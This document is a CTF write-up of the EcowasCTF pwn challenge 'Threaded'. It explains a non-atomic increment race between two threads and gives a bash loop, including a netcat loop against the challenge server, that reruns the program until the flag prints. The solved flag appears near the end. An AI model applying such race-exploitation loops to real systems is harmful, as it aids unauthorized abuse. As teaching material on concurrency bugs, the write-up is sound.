# 🧵 Threaded Chaos: Writeup (PWN)

> **Challenge:** Threaded
> **Category:** PWN
> **Difficulty:** Medium
> **CTF:** EcowasCTF
> **Status:** ✅ Solved

---

## 🧠 Description

> *Two threads. One shared resource.*
> *Let’s make the system behave unexpectedly!*

---

## 🔍 Initial Analysis

### 📦 Binary Info

```bash
file chall
```

* ELF 64-bit
* Dynamically linked
* Not stripped

---

### 🔐 Security Protections

```bash
checksec --file=chall
```

| Protection | Status  |
| ---------- | ------- |
| RELRO      | Partial |
| Canary     | ✅       |
| NX         | ✅       |
| PIE        | ❌       |
| Stripped   | ❌       |

---

## 🧠 First Thoughts

* No PIE → fixed addresses
* Canary + NX → no trivial BOF
* No obvious input → no classic exploit

👉 Suspicious description: **threads + shared resource**

---

## 🔎 Reverse Engineering (Ghidra)

### `main()`

```c
for (i = 0; i < 2; i++) {
    pthread_create(..., thread_func, ...);
}

for (i = 0; i < 2; i++) {
    pthread_join(...);
}

printf("Final value: %d\n", shared_resource);
```

👉 Program launches **2 threads**

---

### `thread_func()`

Core logic:

```c
for (i = 0; i < 5; i++) {
    tmp = shared_resource;
    usleep(100);
    shared_resource = tmp + 1;

    if (shared_resource > 9 && flag_displayed != 1) {
        flag_displayed = 1;
        open("flag.txt");
        read(...);
        printf(...);
    }
}
```

---

## 💥 Vulnerability

### ⚠️ Race Condition (Data Race)

The increment:

```c
shared_resource++
```

is **NOT atomic**.

Actual behavior:

```text
1. Read shared_resource
2. Wait (usleep)
3. Write shared_resource + 1
```

👉 Multiple threads can interfere

---

## 🎬 Race Condition Explained

Expected:

```text
2 threads × 5 increments = 10
```

Reality:

```text
Both threads read same value → overwrite each other
```

Example:

```text
Thread A reads 0
Thread B reads 0
Thread A writes 1
Thread B writes 1
```

👉 Result = **1 instead of 2**

---

## 📊 Observed Behavior

```bash
for i in {1..5000}; do ./chall | tail -n1; done | sort | uniq -c
```

Output:

```
4 Final value: 10
4674 Final value: 5
302 Final value: 6
16 Final value: 7
3 Final value: 8
1 Final value: 9
```

👉 `10` is rare but possible

---

## 🎯 Exploitation Strategy

Goal:

```c
shared_resource > 9
```

👉 Need at least **10 successful increments**

---

### 💡 Idea

Repeat execution until:

* thread scheduling aligns properly
* increments are not lost

---

## ⚙️ Exploit Script

### Local

```bash
while true; do
    ./chall | grep -q "{" && break
done
```

---

### Remote

```bash
while true; do
    out=$(echo | nc labs.ecowasctf.com.gh 1343)
    echo "$out" | grep -q "{" && { echo "$out"; break; }
done
```

---

## 🏁 Flag

```
🏁 EcowasCTF{b0lt_0f_r4c3_c0nd1t10n}
```

---

## 🧠 Key Takeaways

* Not all PWN = memory corruption
* Race conditions are exploitable
* Non-atomic operations are dangerous
* Thread scheduling can be abused

---

## 🔥 Bonus Knowledge

### Atomic vs Non-Atomic

```c
x++
```

is NOT:

```text
single operation
```

but:

```text
read → modify → write
```

👉 Vulnerable to races

---

## 🧵 Conclusion

This challenge demonstrates how **concurrency bugs** can lead to unexpected behavior and be exploited without any memory corruption.

👉 Sometimes, the best exploit is simply **letting the program fail by itself**.

---
